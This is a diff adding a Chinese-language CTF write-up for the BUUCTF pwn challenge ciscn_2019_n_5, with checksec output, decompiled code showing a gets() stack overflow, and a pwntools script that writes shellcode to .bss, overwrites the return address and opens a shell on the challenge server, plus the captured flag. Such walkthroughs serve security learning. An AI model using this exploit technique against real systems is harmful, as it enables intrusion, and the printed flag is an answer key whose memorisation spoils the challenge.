@@ -1993,6 +1993,89 @@ io.interactive()
 
 ------
 
+### [ciscn_2019_n_5](https://buuoj.cn/challenges#ciscn_2019_n_5)
+
+先`file ./ciscn_2019_n_5`查看文件类型再`checksec --file=./ciscn_2019_n_5`检查文件保护情况。`NX disabled`栈可执行。
+
+```bash
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ file ./ciscn_2019_n_5
+./ciscn_2019_n_5: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=9e420b4efe941251c692c93a7089b49b4319f891, with debug_info, not stripped
+
+┌──(tyd㉿kali-linux)-[~/ctf/pwn/buuctf]
+└─$ checksec --file=./ciscn_2019_n_5
+[*] '/home/tyd/ctf/pwn/buuctf/ciscn_2019_n_5'
+    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    No canary found
+    NX:       NX disabled
+    PIE:      No PIE (0x400000)
+    RWX:      Has RWX segments
+```
+
+用`IDA Pro 64bit`打开附件`ciscn_2019_n_5`，按`F5`反汇编源码并查看主函数。
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  char text[30]; // [rsp+0h] [rbp-20h] BYREF
+  setvbuf(stdout, 0LL, 2, 0LL);
+  puts("tell me your name");
+  read(0, name, 0x64uLL);
+  puts("wow~ nice name!");
+  puts("What do you want to say to me?");
+  gets(text);
+  return 0;
+}
+```
+
+`name`变量是直接存储在`.bss`段上的，首地址为`0x601080`。我们可以通过`name`变量把`shellcode`直接写入到`.bss`段中。
+
+```assembly
+.bss:0000000000601080 name            db 64h dup(?)           ; DATA XREF: main+35↑o
+.bss:00000000006010E4                 align 8
+.bss:00000000006010E4 _bss            ends
+```
+
+`text`变量的可用栈大小为`0x20`字节，但是`gets()`函数并没有限制输入，显然存在栈溢出漏洞。双击`text`变量查看其栈结构，需要用`0x20`个字节来覆盖`padding`，还需要`0x8`个字节来覆盖到栈帧。
+
+```assembly
+-0000000000000020 ; D/A/*   : change type (data/ascii/array)
+-0000000000000020 ; N       : rename
+-0000000000000020 ; U       : undefine
+-0000000000000020 ; Use data definition commands to create local variables and function arguments.
+-0000000000000020 ; Two special fields " r" and " s" represent return address and saved registers.
+-0000000000000020 ; Frame size: 20; Saved regs: 8; Purge: 0
+-0000000000000020 ;
+-0000000000000020
+-0000000000000020 text            db 30 dup(?)
+-0000000000000002                 db ? ; undefined
+-0000000000000001                 db ? ; undefined
++0000000000000000  s              db 8 dup(?)
++0000000000000008  r              db 8 dup(?)
++0000000000000010
++0000000000000010 ; end of stack variables
+```
+
+我们可以通过这个栈溢出漏洞劫持程序控制流去执行刚刚写入到`.bss`段中的`shellcode`。
+
+编写`Python`代码求解，得到`flag{f3eef899-2d9e-4f87-9ebe-d19d0edffc77}`。
+
+```python
+from pwn import *
+
+context(arch='amd64', os='linux', log_level='debug')
+io = remote('node4.buuoj.cn', 28021)
+bss_addr = 0x601080 # name
+shellcode = asm(shellcraft.sh())
+io.sendlineafter(b'tell me your name', shellcode)
+payload = b'a'*(0x20+0x8) + p64(bss_addr)
+io.sendlineafter(b'What do you want to say to me?', payload)
+io.interactive()
+```
+
+------
+
 ## ADWorld
 
 ### [get_shell](https://adworld.xctf.org.cn/task/answer?type=pwn&number=2&grade=0&id=5049)
